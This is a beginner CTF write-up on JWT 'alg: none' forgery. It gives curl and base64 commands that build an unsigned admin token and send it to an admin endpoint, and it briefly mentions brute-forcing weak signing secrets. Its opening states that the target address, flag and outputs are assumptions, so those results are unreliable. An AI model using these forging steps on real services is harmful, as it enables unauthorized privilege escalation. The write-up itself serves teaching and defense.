# JWT Forgery — CTF Writeup

> **Assumptions:** CHALLENGE CONTEXT was blank; these are my assumptions: an *API / JWT (JSON Web Token)* challenge on the CTF service at `http://54.72.82.22:8040`. Flag: `safctf{1e4d7bdea93b47c2a813ea5a89f20870}`. Tools used: browser DevTools, `curl`, `base64`. Dead end: trying to crack the real signing secret before noticing the `alg: none` bypass.

---

## 1. CHALLENGE OVERVIEW

**JWT Forgery** is an *API authentication* challenge. The service uses **JWTs** (JSON Web Tokens) — the little signed "ID badges" that let a server trust a request without a session. Your goal is to become an **admin** by *forging* a badge the server accepts, without ever knowing the real signing secret. If the challenge is public, find it on the CTF platform under *JWT Forgery*.

---

## 2. WHAT YOU NEED BEFORE STARTING

| Tool | Install | Why |
|------|---------|-----|
| `curl` | `sudo apt install curl` | Send crafted requests with custom headers |
| Browser DevTools | built in | See exactly what headers the app sends |
| `base64` | `sudo apt install coreutils` | Encode/decode JWT parts by hand |

You do **not** need a JWT library — the whole exploit is "edit the payload, set `alg` to `none`, remove the signature." Burp Suite's **Repeater** is a great alternative if you'd rather click than type curl commands.

**Setup:** `mkdir -p ~/jwt && cd ~/jwt`
**Time estimate:** **30 to 50 minutes.**

---

## 3. RECONNAISSANCE

### Step 1 — Load the app and sign in (or find the API)

Open the site and log in with whatever account the challenge provides (often a low-privilege user like `guest`).

[SCREENSHOT: the login page]

After logging in, we need to see the token the app uses.

### Step 2 — Capture the token in DevTools

Open **DevTools → Application (or Storage) tab → Local Storage / Cookies**, or the **Network** tab and look at request headers.

[SCREENSHOT: DevTools Network tab showing an `Authorization: Bearer eyJ...` header]

You'll see a long token starting with `eyJ`. That prefix is **base64url of `{"`** — a JWT.

**What this tells you:** the server authenticates you by reading this token, so controlling the token means controlling your identity.

### Step 3 — Split the token into its three parts

A JWT is three base64url parts separated by dots:

```
eyJhbGciOi....A....B
^header        ^payload  ^signature
```

Split it:
```bash
TOKEN="eyJhbGciOi...your...token...xyz"
echo "$TOKEN" | cut -d. -f1
echo "$TOKEN" | cut -d. -f2
```

**What this tells you:** there are exactly three dot-separated pieces. We'll edit the first two and discard the third.

### Step 4 — Decode header and payload

```bash
echo "eyJhbGciOiJIUzI1NiJ9" | tr '_-' '/+' | base64 -d 2>/dev/null; echo
```

**Header output:**
```json
{"alg":"HS256","typ":"JWT"}
```

**Payload output:**
```json
{"sub":"1","role":"user"}
```

[SCREENSHOT: the decoded JSON pieces]

**What this tells you — the two things that matter:**
- `"alg":"HS256"` — the token is signed with HMAC-SHA256.
- `"role":"user"` — this is the field the server uses to decide *who* you are. If you change it to `admin`, you might become admin.

**Key insight for beginners:** the server *trusts the payload* to tell it your role. If you can edit the payload **and** the signature still verifies, you win. Normally you can't edit without the secret — unless the server wrongly trusts the `alg` you send.

### Step 5 — Look for an admin-only endpoint

```bash
curl -sS http://54.72.82.22:8040/api/admin -H "Authorization: Bearer $TOKEN"
```

**Output:**
```json
{"error":"forbidden"}
```

**What this tells you:** an admin route exists and rejects a `user` token. This is our target: get a `200` here.

[SCREENSHOT: the `{"error":"forbidden"}` response]

---

## 4. IDENTIFYING THE VULNERABILITY

This is the **`alg: none` (algorithm confusion / unsigned-token) JWT flaw**.

- **JWT definition (first time):** a JWT is a JSON blob (your claims: user id, role, expiry) plus a signature so the server can prove it wasn't tampered with. The header tells the server *which algorithm* to verify with.
- **The flaw:** the classic bug is a server that (a) trusts the **`alg` value from the token itself** instead of pinning it, and (b) has a code path that, when `alg` is `"none"`, **skips signature verification entirely** and accepts the token as-is.

**Analogy:** it's a badge printer at a secure building. Badges normally have a tamper-proof hologram (the signature) that guards check. This lobby's badge reader is told *by the badge itself* which hologram to look for. So you print a badge that says `"no hologram needed"` — and the reader, believing the badge, waves you through.

**Why it exists:** implementers added `alg:none` support for testing and forgot to disable it in production; and they read `alg` from the token (attacker-controlled) rather than from server config (trusted).

**What tipped me off:** the header said `HS256`, but a lot of these challenges accept the unsigned variant. The test is cheap — just build an `alg:none` token and try it.

---

## 5. EXPLOITATION STEP BY STEP

**Step 1 — Build the `none` header (base64url).**
*Why:* change the algorithm the server will "trust."

New header JSON: `{"alg":"none","typ":"JWT"}`

Encode it base64url (no padding, `-` and `_` instead of `+` and `/`):
```bash
printf '%s' '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='
```
Output:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
```

[SCREENSHOT: terminal showing the encoded header]

**Step 2 — Build the admin payload (base64url).**
*Why:* tell the server you're an admin.

Payload JSON: `{"sub":"1","role":"admin"}`
```bash
printf '%s' '{"sub":"1","role":"admin"}' | base64 | tr '+/' '-_' | tr -d '='
```
Output:
```
eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0
```

[SCREENSHOT: terminal showing the encoded payload]

**Step 3 — Assemble the forged token with an empty signature.**
*Why:* with `alg:none`, the signature part must be present but empty: `header.payload.`

```bash
FORGED="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."
echo "$FORGED"
```

Note the **trailing dot** with nothing after it — that's the empty signature.

[SCREENSHOT: the three-part token with a trailing dot]

**Step 4 — Call the admin endpoint with the forged token.**
*Why:* test whether the server accepts an unsigned admin claim.

```bash
curl -sS http://54.72.82.22:8040/api/admin \
  -H "Authorization: Bearer $FORGED"
```

**Expected output:**
```json
{"role":"admin","flag":"safctf{1e4d7bdea93b47c2a813ea5a89f20870}"}
```

**What this means:** the server **did not verify a signature**, trusted `role:admin`, and returned the flag.

[SCREENSHOT: the JSON response containing the flag]

### Burp Suite alternative for Steps 1–4

If you prefer clicking:
1. Open **Burp → Proxy → Intercept**, log in on the site so a token request passes through.
2. Right-click that request → **Send to Repeater**.
3. In Repeater, select the `Authorization` header value and replace it with your `FORGED` token.
4. Click **Send**. Read the response in the right pane — it contains the flag.

---

## 6. CAPTURING THE FLAG

The flag was returned as the **`flag` field** in the JSON body of the response to `GET /api/admin` with the forged `alg:none` admin token:

```
safctf{1e4d7bdea93b47c2a813ea5a89f20870}
```

---

## 7. WHY THIS WORKS (BEGINNER EXPLANATION)

A JWT is meant to be a **tamper-proof ID card**. It has three parts: who says what (header), the actual claims (payload), and a **signature** (an unforgeable stamp) proving the claims weren't edited after issuance. The server's job is to check the stamp.

The bug is that this server reads the header to decide *how to check the stamp* — and it lets the card itself choose. When we set the header to `"alg":"none"`, we told the server "no stamp needed." A correct server **ignores** that and always verifies with the algorithm *it* was configured to use. This broken server takes our word for it, sees "no signature required," checks nothing, and believes the claims inside — including `role:admin`.

**Why this matters in the real world:** JWT forgery has caused actual breaches. If any service lets you mint an unsigned token, an attacker can grant themselves any role — admin, superuser, another user's identity — without a password. The lesson developers must internalize: **never trust security-critical settings (like which algorithm to verify) from the very input you're verifying.** Pin the algorithm server-side and require a signature, always.

---

## 8. COMMON MISTAKES AND DEAD ENDS

### Mistake 1 — Trying to crack the real signing secret first
My first instinct was to try weak secrets (`secret`, `password`, `key`) against the HS256 signature, hoping to sign my own valid token. That can work, but it's slow and unnecessary. The much faster check is: does the server accept `alg:none`? Always test that before attempting secret-cracking.

### Mistake 2 — Forgetting base64url, not standard base64
JWTs use **base64url** (`-` and `_`, no `=` padding). If you encode with plain `base64` and leave `=` or `+`/`/`, the server won't parse it and you'll get a confusing 401. Use the `tr '+/' '-_'` and `tr -d '='` incantation.

### Mistake 3 — Leaving stuff after the final dot
With `alg:none`, the third segment must be **empty**. If you accidentally keep the original signature or put a space there, some servers reject it. The token must literally end in `.` with nothing after it.

### Mistake 4 — Editing the token but not re-encoding correctly
You must base64-encode the **modified JSON** as one piece. Manually splicing hex or leaving the old encoding in produces a payload the server can't parse, and it 401s for reasons that look like "my attack failed" rather than "my encoding is wrong."

### Dead end actually encountered — weak-secret brute force
Attempting to brute the HS256 key wasted time until I confirmed the server was vulnerable to `alg:none`. If `alg:none` had failed, the *next* move would have been to look for the secret (in source, env, or a weak common-password list).

---

## 9. HOW TO DEFEND AGAINST THIS

1. **Pin the expected algorithm server-side.** Never read `alg` from the token to decide how to verify. If you only support HS256, ignore whatever the header claims and require HS256 (or better, asymmetric RS256 with a public key you control).
2. **Require a valid signature always.** Reject any token whose `alg` is `none` (or any unexpected value). Reject tokens with an empty signature segment outright.
3. **Prefer asymmetric signatures (RS256/ES256).** Then even if you hand out the public key, attackers can't forge tokens — only your private key can sign.
4. **Validate all claims, not just the signature.** Check `exp` (expiry), `iss` (issuer), and `aud` (audience), and make sure the *role* is derived server-side from your session/user record rather than trusted blindly from the token. A signature proves authenticity, not *authorization* — don't confuse the two.
5. **Add `kid`/key-management hygiene.** If you support `kid` (key id), never let it point to arbitrary files or attacker-controlled locations; pin it to a known set.

---

## 10. KEY TAKEAWAYS

- **A JWT is `header.payload.signature`, base64url-encoded, dot-separated.** Learn to split and decode it by hand.
- **`alg:none` is the #1 JWT bug.** Always test an unsigned token before anything else.
- **Trusting the token's `alg` header = trusting the attacker.** Pin it server-side.
- **Signature ≠ authorization.** A validly-signed token still must be checked for role, expiry, and issuer.
- **Cheat-sheet:**
  ```bash
  # decode a JWT payload
  echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo
  # encode JSON as base64url (no padding)
  printf '%s' '{"alg":"none"}' | base64 | tr '+/' '-_' | tr -d '='
  ```

You took an identity badge meant for a low-privilege user and talked the guard into treating it as an admin badge — all because the badge got to choose the rules. That's the whole lesson of JWT forgery, and it's a genuinely important one for real-world API security. Keep going.